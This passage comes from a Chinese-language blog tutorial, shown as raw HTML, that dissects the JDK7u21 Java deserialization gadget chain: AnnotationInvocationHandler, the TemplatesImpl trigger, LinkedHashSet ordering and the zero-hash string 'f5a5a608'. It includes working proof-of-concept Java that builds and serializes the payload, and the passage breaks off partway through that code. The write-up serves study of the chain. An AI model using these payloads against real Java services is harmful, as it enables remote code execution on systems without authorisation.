   <span class="comment">//把结果与在构造函数中定义的this.memberValues做对比，若一样则判定相等</span></span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> var4 = <span class="number">0</span>; var4 &lt; var3; ++var4) &#123;</span><br><span class="line">                Method var5 = var2[var4];<span class="comment">//遍历获取方法</span></span><br><span class="line">                String var6 = var5.getName();<span class="comment">//获取方法名字</span></span><br><span class="line">                Object var7 = <span class="keyword">this</span>.memberValues.get(var6);<span class="comment">//获取我们控制的menberValues中的值</span></span><br><span class="line">                Object var8 = <span class="keyword">null</span>;</span><br><span class="line">                <span class="comment">//看看var1是不是也是一个代理类，如果是获取它的代理实现类（这里没用）</span></span><br><span class="line">                AnnotationInvocationHandler var9 = <span class="keyword">this</span>.asOneOfUs(var1);</span><br><span class="line">                <span class="keyword">if</span> (var9 != <span class="keyword">null</span>) &#123;</span><br><span class="line">                    var8 = var9.memberValues.get(var6);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="comment">//不是代理类，进入此处</span></span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        var8 = var5.invoke(var1);<span class="comment">//反射调用！！！！</span></span><br><span class="line">                        <span class="comment">//这里的意思就是 var1.var5()</span></span><br><span class="line">                        <span class="comment">//根据this.type类型遍历所有方法，调用传入参数var1中的所有对应方法。</span></span><br><span class="line">                        &#125; <span class="keyword">catch</span> (InvocationTargetException var11) &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (IllegalAccessException var12) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> AssertionError(var12);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"><span class="comment">//该函数原本的功能 需要比较下调用返回结果与预设值一样不。</span></span><br><span class="line">                <span class="keyword">if</span> (!memberValueEquals(var7, var8)) &#123;</span><br><span class="line">                    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure><p>equals方法会根据this.type类中的方法去遍历调用传入对象中的所有对应的方法。那么！</p><ol><li><p>我们可以构筑一个AnnotationInvocationHandler类，构造函数中选择一个this.type，this.type这个类中需要包含我们要恶意执行的方法。</p></li><li><p>把这个AnnotationInvocationHandler类与随便什么接口进行绑定（因为我们需要调用的是equals，只要是一个Object对象就会有equals方法 maybe？）</p><p> <img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9svznu1j30xk0nxwh4.jpg" alt="代理接口有equals.png"></p></li><li><p>调用这个代理类的equals方法，同时給入恶意实例，就会遍历this.type这个类中的方法对恶意实例中的对应方法进行调用。唯一的缺点就是调用的方法不能传入参数。（因为<code>var5.invoke(var1);</code>只传入了对象，没有传入参数）</p></li></ol><p>我们需要调用的是<code>TemplatesImpl.newTransformer()</code>，刚好这个方法不需要传入参数！</p><p>再是this.type=Templates.class，因为TemplatesImpl继承自Templates接口，并且它有我们要的方法，并且在第一个（为啥需要恰好又刚好在第一个，之后有说法）。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">Templates</span> </span>&#123;</span><br><span class="line">    <span class="function">Transformer <span class="title">newTransformer</span><span class="params">()</span> <span class="keyword">throws</span> TransformerConfigurationException</span>; </span><br><span class="line">    <span class="function">Properties <span class="title">getOutputProperties</span><span class="params">()</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>给出poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"><span class="comment">//AnnotationInvocationHandler构造函数的this.memberValues</span></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    <span class="comment">//获取AnnotationInvocationHandler构造函数</span></span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    <span class="comment">//由于是缺省修饰符，不同的包，不能直接调用。允许调用</span></span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//创建AnnotationInvocationHandler实例，this.type=Templates.class</span></span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);</span><br><span class="line">    <span class="comment">//Override是一个啥都没有的接口，这里用这个类，表示其实绑定啥都没关系</span></span><br><span class="line">    <span class="comment">//在高版本的jdk中，在构造函数中对于type做了校验，如果要在高版本中构造payload，需要使用反射机制构筑。如果对方也是高版本的jdk（即经过了修复）那么我们构筑的InvocationHandler类也是因为构造方法通过不了而无法利用。具体我们在后面修复情况中说到。</span></span><br><span class="line">    <span class="comment">//InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Override.class,map);</span></span><br><span class="line">     <span class="comment">//Reflections.setFieldValue(tempHandler, "type", Templates.class);</span></span><br><span class="line">    <span class="comment">//有些地方POC写的是Templates.class类，其实没必要</span></span><br><span class="line">    Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Override.class&#125;,invocationHandler);</span><br><span class="line">    <span class="comment">//恶意类</span></span><br><span class="line">    <span class="keyword">final</span> Object templates = Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);</span><br><span class="line">    <span class="comment">//调用，执行`TemplatesImpl.newTransformer()`</span></span><br><span class="line">    proxy.equals(templates);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="this-type的讲究"><a href="#this-type的讲究" class="headerlink" title="this.type的讲究"></a>this.type的讲究</h4><p>为啥this.type需要选用类中第一个方法是我们需要调用的方法的类呢？</p><p>因为不是的话，就需要考虑更多，比如报错退出。可以看到在执行完我们的payload后是会报错退出的，当然这对我们paylaod的执行没有影响。</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9twkj0rj323212u7ld.jpg" alt="newTransformer执行的命令.png"></p><p>但是假如我们需要调用的方法不在第一个，而前面是一个需要参数的方法，就会因为没有传入参数而报错退出。（比如我们把Templates.class改成TemplatesImpl.class）</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9u9k0lzj31x70z579a.jpg" alt="TemplatesImple_type报错.png"></p><p>如果我们需要调用的方法前面有一些其他方法，但是都是不需要参数的，我们还需要构造this.memberValues，让前面这些函数的返回值与this.menberValues里面一致才不会返回false退出。就会有一串的麻烦（目前来看这样也是可行的，但是假如这里真的改了this.memberValues之后LinkedHashSet那关就过不去了！实际上我们只能且必须要找到一个第一个方法是能够代码执行的方法！）</p><p>所幸我们可以找到一个Templates类，它进行代码执行的方法是第一个，万幸。</p><h2 id="进一步延伸至LinkedHashSet"><a href="#进一步延伸至LinkedHashSet" class="headerlink" title="进一步延伸至LinkedHashSet"></a>进一步延伸至LinkedHashSet</h2><p>接下来需要触发<code>proxy.equals(templates)</code>，这种<code>a.equals(b)</code>的形式。a是我们构建的动态代理返回对象，b是恶意TemplatesImpl类。</p><p><strong>LinkedHashSet类</strong>继承自<strong>Hashset</strong>，具有Hashset的全部特点：元素不重复，快速查找，快速插入。新增的特性是有序，数据结构上使用双向链表实现。（之所以用LinkedHashSet就是因为其有序的特性，后面会说到为什么需要有序）</p><p><code>LinkedHashSet.java</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LinkedHashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">extends</span> <span class="title">HashSet</span>&lt;<span class="title">E</span>&gt;</span></span><br><span class="line"><span class="class">    <span class="keyword">implements</span> <span class="title">Set</span>&lt;<span class="title">E</span>&gt;, <span class="title">Cloneable</span>, <span class="title">java</span>.<span class="title">io</span>.<span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="comment">//给一个我们要用到的构造函数</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LinkedHashSet</span><span class="params">()</span> </span>&#123;</span><br><span class="line">            <span class="keyword">super</span>(<span class="number">16</span>, .<span class="number">75f</span>, <span class="keyword">true</span>);<span class="comment">//进去这里看看</span></span><br><span class="line">        &#125;</span><br><span class="line">    <span class="comment">//LinkedHashSet这个类其实根本没有自己实现过类，只有四个构造函数，实际上使用LinkedHashMap实现有序功能的</span></span><br><span class="line">    ...</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>super就进入HashSet了，<code>HashSet.java</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">HashSet(<span class="keyword">int</span> initialCapacity, <span class="keyword">float</span> loadFactor, <span class="keyword">boolean</span> dummy) &#123;</span><br><span class="line">    map = <span class="keyword">new</span> LinkedHashMap&lt;&gt;(initialCapacity, loadFactor);<span class="comment">//可以看到使用LinkedHashMap创建了有序集合</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>具体是如何实现这个集合的，我们就不纠结了。我们需要通过LinkedHashSet连接<strong>writeObject序列化与readObject反序列化</strong>这个利用链入口至<strong>a.equals(b)</strong>这个我们之前得到的触发点。</p><p>先看LinkedHashSet的序列化与反序列化。LinkedHashSet获取的是LinkedHashMap的实例，而LinkedHashMap又继承自HashSet，所以最终的序列化与反序列化就是在<code>HashSet类</code>中。</p><p>我们跟着反序列化触发链来看。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//我们构造payload，最终调用writeObject </span></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(java.io.ObjectOutputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 序列化任何隐藏的序列化魔术（不懂什么骚操作）</span></span><br><span class="line">        s.defaultWriteObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化map的容量与加载器</span></span><br><span class="line">        s.writeInt(map.capacity());</span><br><span class="line">        s.writeFloat(map.loadFactor());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化map的大小</span></span><br><span class="line">        s.writeInt(map.size());</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历序列化每一个map中的元素</span></span><br><span class="line">        <span class="keyword">for</span> (E e : map.keySet())</span><br><span class="line">            s.writeObject(e);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//在服务端触发payload，最先触发的函数。</span></span><br><span class="line"> <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">        <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        <span class="comment">// 反序列化任何隐藏的序列化魔术（不懂什么骚操作）</span></span><br><span class="line">        s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化HashMap容量和加载器并创建备份HashMap</span></span><br><span class="line">        <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">        <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">        map = (((HashSet)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">               <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">               <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 反序列化map的大小</span></span><br><span class="line">        <span class="keyword">int</span> size = s.readInt();</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 遍历反序列化每一个map的元素，并把他们加入到map中</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">            E e = (E) s.readObject();<span class="comment">//获取我们每一个map元素</span></span><br><span class="line">            map.put(e, PRESENT);<span class="comment">//重新放入map中，我们进入此处,就是出在这里。</span></span><br><span class="line">            <span class="comment">//e为我们map的元素，present是一个常量，就是一个新的object对象</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>java.util.HashMap#put</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//这个key，就是我们传入的元素，value是一个固定值木有用。</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//key不能为null</span></span><br><span class="line">        <span class="keyword">if</span> (key == <span class="keyword">null</span>)</span><br><span class="line">            <span class="keyword">return</span> putForNullKey(value);</span><br><span class="line">    <span class="comment">//计算key的hash值</span></span><br><span class="line">        <span class="keyword">int</span> hash = hash(key) ;</span><br><span class="line">        <span class="keyword">int</span> i = indexFor(hash, table.length);</span><br><span class="line">    <span class="comment">// 遍历已有的元素</span></span><br><span class="line">        <span class="keyword">for</span> (Entry&lt;K,V&gt; e = table[i]; e != <span class="keyword">null</span>; e = e.next) &#123;</span><br><span class="line">            Object k;</span><br><span class="line">            <span class="comment">//本意是判断最新的元素是否已经存在的元素</span></span><br><span class="line">            <span class="keyword">if</span> (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;</span><br><span class="line">                <span class="comment">//如果是已经存在的元素，就返回已经存在的value。不插入。</span></span><br><span class="line">                V oldValue = e.value;</span><br><span class="line">                e.value = value;</span><br><span class="line">                e.recordAccess(<span class="keyword">this</span>);</span><br><span class="line">                <span class="keyword">return</span> oldValue;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        modCount++;</span><br><span class="line">    <span class="comment">//如果不是已经存在的元素，就插入到table中</span></span><br><span class="line">        addEntry(hash, key, value, i);</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们专注于<code>if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) {</code>这句语句。（e为前一个元素，key为当前元素）</p><p>可以看到<code>key.equals(k)</code>符合我们前面说到的<code>a.equals(b)</code>的格式。在只有两个元素的情况下，k为有序集合中第一个元素，key为第二个元素。</p><p>即我们需要一个有序集合<code>{templates，proxy}</code>才能满足<code>proxy.equals(templates)</code>这一句触发语句。</p><blockquote><p> 这也就是为什么需要有序集合的原因，如果是普通集合，不会一定会符合这个<code>a.equals(b)</code>的顺序</p></blockquote><p>由于这里代码<code>(e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k)))</code>调用第三个语句就需要满足条件</p><ul><li><code>e.hash == hash</code>：templates的hash == proxy的hash</li><li><code>(k = e.key) != key</code> ：templates（就是k） ！= proxy（就是key）（我们需要||左边这个表达式不满足，才会执行右边的漏洞触发函数key.equals(k)。这是||的特性，执行到一个为true的，后面的表达式就不执行了）</li></ul><p>因为templates和proxy完全是两个不同的对象。所以第二个条件满足。</p><p>但是第一个条件需要hash相同，如果不是偷看答案的小白（我自己）肯定会突然僵住，特么这咋可能hash相等，当场直接gg。实际上套路还是很深。看hash是如何生成的</p><p>java.util.HashMap#hash</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object k)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (useAltHashing) &#123;</span><br><span class="line">            <span class="keyword">if</span> (k <span class="keyword">instanceof</span> String) &#123;</span><br><span class="line">                <span class="keyword">return</span> sun.misc.Hashing.stringHash32((String) k);</span><br><span class="line">            &#125;</span><br><span class="line">            h = hashSeed;</span><br><span class="line">        &#125;</span><br><span class="line">    </span><br><span class="line">        h ^= k.hashCode();<span class="comment">//惊为天人的调用了我们传入的对象k的hashCode函数，也就是说我们有可能可以对于hash值进行一定的操控</span></span><br><span class="line"><span class="comment">//接下来又是一些骚操作</span></span><br><span class="line">        <span class="comment">// This function ensures that hashCodes that differ only by</span></span><br><span class="line">        <span class="comment">// constant multiples at each bit position have a bounded</span></span><br><span class="line">        <span class="comment">// number of collisions (approximately 8 at default load factor).</span></span><br><span class="line">        h ^= (h &gt;&gt;&gt; <span class="number">20</span>) ^ (h &gt;&gt;&gt; <span class="number">12</span>);</span><br><span class="line">        <span class="keyword">return</span> h ^ (h &gt;&gt;&gt; <span class="number">7</span>) ^ (h &gt;&gt;&gt; <span class="number">4</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>我们传入的obj有TemplatesImpl类，但是这个类中没有自实现hashcode方法。</p><p>有Proxy对象（进入AnnotationInvocationHandler拦截器实现类），proxy.hashCode会先进入AnnotationInvocationHandler的invoke拦截器。（跟equals一样一样的，任何函数都会先进入invoke方法）</p><p><code>sun.reflect.annotation.AnnotationInvocationHandler#invoke</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Method var2, Object[] var3)</span> </span>&#123;</span><br><span class="line">        String var4 = var2.getName();</span><br><span class="line">        Class[] var5 = var2.getParameterTypes();</span><br><span class="line">        <span class="keyword">if</span> (var4.equals(<span class="string">"equals"</span>) &amp;&amp; var5.length == <span class="number">1</span> &amp;&amp; var5[<span class="number">0</span>] == Object.class) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">this</span>.equalsImpl(var3[<span class="number">0</span>]);<span class="comment">//我们之前payload触发在这</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">assert</span> var5.length == <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (var4.equals(<span class="string">"toString"</span>)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.toStringImpl();</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (var4.equals(<span class="string">"hashCode"</span>)) &#123;<span class="comment">//往下看！这个可爱的invoke实现上对于hashCode这个函数还是有独特处理的！！！！</span></span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">this</span>.hashCodeImpl();<span class="comment">//进去看看</span></span><br></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler#hashCodeImpl</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       Entry var3;</span><br><span class="line">       <span class="keyword">for</span>(Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator(); var2.hasNext(); var1 += <span class="number">127</span> * ((String)var3.getKey()).hashCode() ^ memberValueHashCode(var3.getValue())) &#123;</span><br><span class="line">           var3 = (Entry)var2.next();</span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> var1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p>这边写的贼复杂，改成简单点</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">int</span> <span class="title">hashCodeImpl</span><span class="params">()</span> </span>&#123;</span><br><span class="line">       <span class="keyword">int</span> var1 = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">       Entry var3;</span><br><span class="line">    <span class="comment">//this.memberValues是我们构造AnnotationInvocationHandler时，可控的那个map</span></span><br><span class="line">       Iterator var2 = <span class="keyword">this</span>.memberValues.entrySet().iterator();<span class="comment">//获取遍历器</span></span><br><span class="line">       <span class="keyword">for</span>( ;var2.hasNext(); ) &#123;</span><br><span class="line">           var3 = (Entry)var2.next();</span><br><span class="line">           String key = var3.getKey();<span class="comment">//（可控map的键）</span></span><br><span class="line">           Object value = var3.getValue()；<span class="comment">//（可控map的值）</span></span><br><span class="line">           var1 += <span class="number">127</span> * </span><br><span class="line">               key.hashCode() ^ <span class="comment">//可控map的键 的 hashCode</span></span><br><span class="line">               memberValueHashCode(value); <span class="comment">//可控map的值的 hashCode</span></span><br><span class="line">       &#125;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">return</span> var1;</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure><p><code>sun.reflect.annotation.AnnotationInvocationHandler#memberValueHashCode</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">memberValueHashCode</span><span class="params">(Object var0)</span> </span>&#123;</span><br><span class="line">        Class var1 = var0.getClass();</span><br><span class="line">        <span class="keyword">if</span> (!var1.isArray()) &#123;<span class="comment">//不是数组的话获取传入值的hashCode。</span></span><br><span class="line">            <span class="keyword">return</span> var0.hashCode(); <span class="comment">//返回var0这个对象的hashCode</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure><p>我们的目的是为了满足以下等式：</p><p><strong>Proxy的hashCode = 127 * 可控键的hashCode ^ 可控值的hashCode == TemplatesImpl的hashCode</strong></p><blockquote><p>*与 ^（异或） ，前者优先级高，后者优先级低，所以正常从左到右运算</p><p>又 0 ^ n = n</p></blockquote><p>那么只需要可控键的hashCode等于0就会出现：</p><p><strong>127 * 0 ^ TemplatesImpl的hashCode == TemplatesImpl的hashCode</strong></p><p>this.memberValues中map中键值对的值为我们的恶意TemplatesImpl类即可，接下来需要它的键名的hashCode为0</p><p>研究员就是会寻找到一些神奇的值比如<code>&quot;f5a5a608&quot;</code>，<code>&quot;&quot;</code> 这些值的hashCode为0！！！</p><p><img src="http://ww1.sinaimg.cn/large/006iKNp3ly1g9h9uqejl8j31440akmy1.jpg" alt="hashCode为0.png"></p><p>所以我们在this.memberValues中赋值键值对 <code>(&quot;f5a5a608&quot;-&gt;TemplatesImpl恶意类)</code>即可。</p><p>看payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">//生成恶意的templates类</span></span><br><span class="line">    Templates templates = Gadgets.createTemplatesImpl(<span class="string">"calc"</span>);</span><br><span class="line">    <span class="comment">//AnnotationInvocationHandler类this.memberValues的map,填入键值对来满足hash相等</span></span><br><span class="line">    Map map = <span class="keyword">new</span> HashMap();</span><br><span class="line">    String magicStr = <span class="string">"f5a5a608"</span>;</span><br><span class="line">    <span class="comment">//String magicStr_null = "";//也可</span></span><br><span class="line">    <span class="comment">//此处需要的先往map中放入一个没用的值，之后说明</span></span><br><span class="line">    map.put(magicStr,<span class="string">"Override"</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成proxy对象</span></span><br><span class="line">    <span class="keyword">final</span> Constructor&lt;?&gt; ctor = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>).getDeclaredConstructors()[<span class="number">0</span>];</span><br><span class="line">    ctor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">    InvocationHandler invocationHandler = (InvocationHandler) ctor.newInstance(Templates.class,map);<span class="comment">//this.type,this.memberValues</span></span><br><span class="line">    Override proxy = (Override) Proxy.newProxyInstance(InvocationHandler.class.getClassLoader(),<span class="keyword">new</span> Class[]&#123;Override.class&#125;,invocationHandler);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//生成LinkedHashSet，按照顺序一次放入templates和proxy</span></span><br><span class="line">    HashSet set = <span class="keyword">new</span> LinkedHashSet(); <span class="comment">// 填入</span></span><br><span class="line">    set.add(templates);</span><br><span class="line">    set.add(proxy);</span><br><span class="line">    <span class="comment">//重新修改map的值</span></span><br><span class="line">    map.put(magicStr,templates);</span><br><span class="line"></span><br><span class="line">    ByteArrayOutputStream byteArrayOutputStream = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">    <span class="comment">//序列化</span></span><br><span class="line">    ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(byteArrayOutputStream);</span><br><span class="line">    objectOutputStream.writeObject(set);<span class="comment">//序列化对象</span></span><br><span class="line">    objectOutputStream.flush();</span><br><span class="line">    objectOutputStream.close();</span><br><span class="line">    <span class="comment">//反序列化</span></span><br><span class="line">    <span class="keyword">byte</span>[] bytes = byteArrayOutputStream.toByteArray(); <span class="comment">//读取序列化后的对象byte数组</span></span><br><span class="line">    